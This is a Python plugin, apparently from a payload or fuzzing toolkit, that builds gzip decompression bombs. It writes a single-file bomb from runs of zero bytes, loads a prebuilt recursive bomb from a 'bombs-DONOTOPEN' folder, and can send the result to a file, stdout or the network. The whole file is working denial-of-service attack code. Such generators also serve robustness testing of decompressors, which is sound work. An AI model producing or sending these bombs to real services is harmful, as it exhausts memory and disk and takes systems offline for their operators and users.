import gzip
import os
import logging
import io
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_file', 'layer', 'recursive'])
options.add_option('target_size', 100000,
                   'Desired size of decompressed file in bytes (not applicable to recursive zip bombs)')

# TODO - description of exploit


def run(generator, output):

    if output.OUTPUT_NAME not in ["file", "stdout", "network"]:
        raise ValueError("Unsupported output type for gz bomb.")

    if output.OUTPUT_NAME == "file" and output.options["format"] != "binary":
        raise ValueError("Only binary files are supported for output.")

    if options['type'] == 'recursive':
        with open(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/gz_recursive.gz') as f:
            contents = f.read()
        output.output([contents])

    elif options['type'] == 'single_file':
        ret = singlefilebomb(options['target_size'])
        output.output([ret])

    elif options['type'] == 'layer':
        logging.warning('Not yet implemented.')


def singlefilebomb(target_size):

    memfile = io.BytesIO()

    with gzip.open(memfile, 'w') as f:
        if target_size > 10000:
            for i in range(target_size // 1000):
                f.write(b'0'*1000)
            f.write(b'0'*(target_size % 1000))
        else:
            f.write(b'0'*target_size)
    return memfile.getvalue()
